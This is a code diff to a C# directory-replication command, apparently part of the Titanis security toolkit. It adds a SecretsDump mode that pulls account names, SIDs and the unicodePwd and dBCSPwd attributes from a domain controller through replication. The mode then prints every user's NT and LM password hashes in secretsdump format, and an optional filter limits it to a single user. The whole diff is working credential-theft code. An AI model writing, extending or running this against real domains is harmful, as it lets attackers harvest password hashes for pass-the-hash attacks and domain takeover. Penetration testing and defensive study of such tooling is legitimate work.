@@ -9,6 +9,7 @@ using Titanis.Net;
 using Titanis.Security;
 using Titanis.Security.Kerberos;
 using Titanis.Winterop.SamServer;
+using Titanis.Winterop.Security;
 
 namespace Titanis.Cli.Dsrep;
 
@@ -40,6 +41,14 @@ public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback
 	[Parameter]
 	[Description("Name of keytab file to export to")]
 	public FileSpec? ExportKeytab { get; set; }
+
+	[Parameter]
+	[Description("Output hashes in secretsdump format (domain\\user:rid:lmhash:nthash:::)")]
+	public SwitchParam SecretsDump { get; set; }
+
+	[Parameter]
+	[Description("Replicate only this user (by sAMAccountName). If omitted with -SecretsDump, all user accounts are dumped.")]
+	public string? JustDcUser { get; set; }
 
 	[Parameter]
 	[Description("Starting USN vector (as 48 hex bytes)")]
@@ -102,6 +111,7 @@ public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback
 		];
 	private List<KeytabEntry> _keytabEntries;
 	private string? _realm;
+	private string? _domainNetbios;
 
 	protected abstract ExtendedOpRequest GetExop();
 
@@ -116,11 +126,25 @@ public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback
 		var dcInfo = dcInfos[0];
 
 		this._realm = dcInfo.DnsHostName.Contains('.') ? dcInfo.DnsHostName.Substring(dcInfo.DnsHostName.IndexOf('.') + 1).ToUpper() : null;
-
-
-
+		this._domainNetbios = this.RpcParameters.Authentication.UserDomain
+			?? this._realm;
 
 		var outputAttrs = GetLdapAttributes(this.OutputFields);
+
+		if (this.SecretsDump.IsSet)
+		{
+			var requiredOids = new[]
+			{
+				LdapAttributeTypes.SAMAccountName.Oid,
+				LdapAttributeTypes.ObjectSid.Oid,
+				LdapAttributeTypes.UnicodePwd.Oid,
+				LdapAttributeTypes.DBCSPwd.Oid,
+			};
+			var attrSet = new HashSet<string>(outputAttrs);
+			foreach (var oid in requiredOids)
+				attrSet.Add(oid);
+			outputAttrs = attrSet.ToArray();
+		}
 
 		var kt = new KeytabFile();
 		this._keytabEntries = kt.Entries;
@@ -209,6 +233,9 @@ public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback
 		return new KeytabEntry(spn, realm, 0, key.Kvno ?? 0, (EType)key.KeyType, key.Bytes);
 	}
 
+	private static readonly string EmptyLmHash = "aad3b435b51404eeaad3b435b51404ee";
+	private static readonly string EmptyNtHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
+
 	private SemaphoreSlim _outputLock = new SemaphoreSlim(1, 1);
 	async Task IDrsChangeCallback.OnObjectReplicated(DsObject obj)
 	{
@@ -218,12 +245,47 @@ public abstract class ReplicateCommand : DsbindCommand, IDrsChangeCallback
 			var entry = obj.ToLdapEntry();
 
 			AddKeytabEntries(entry, this._realm, this._keytabEntries);
-			this.WriteRecord(entry);
+
+			if (this.SecretsDump.IsSet)
+				WriteSecretsDumpLine(entry);
+			else
+				this.WriteRecord(entry);
 		}
 		finally
 		{
 			this._outputLock.Release();
 		}
+	}
+
+	private void WriteSecretsDumpLine(LdapEntry entry)
+	{
+		var samAccountName = entry[LdapAttributeTypes.SAMAccountName]?.Value as string;
+		if (samAccountName is null)
+			return;
+
+		if (this.JustDcUser is not null && !samAccountName.Equals(this.JustDcUser, StringComparison.OrdinalIgnoreCase))
+			return;
+
+		var ntHashAttr = entry[LdapAttributeTypes.UnicodePwd]?.Value;
+		if (ntHashAttr is not BinaryString ntBinary || ntBinary.Bytes.Length != 16)
+			return;
+
+		var sidObj = entry[LdapAttributeTypes.ObjectSid]?.Value;
+		uint rid = 0;
+		string domain = this._domainNetbios ?? "UNKNOWN";
+		if (sidObj is SecurityIdentifier sid)
+		{
+			rid = sid.Rid;
+		}
+
+		var lmHashAttr = entry[LdapAttributeTypes.DBCSPwd]?.Value;
+		string lmHash = EmptyLmHash;
+		if (lmHashAttr is BinaryString lmBinary && lmBinary.Bytes.Length == 16)
+			lmHash = lmBinary.Bytes.ToHexString();
+
+		string ntHash = ntBinary.Bytes.ToHexString();
+
+		this.Context.WriteOutputLine($"{domain}\\{samAccountName}:{rid}:{lmHash}:{ntHash}:::");
 	}
 
 	async Task IDrsChangeCallback.OnError(DsName objectName, Exception exception)
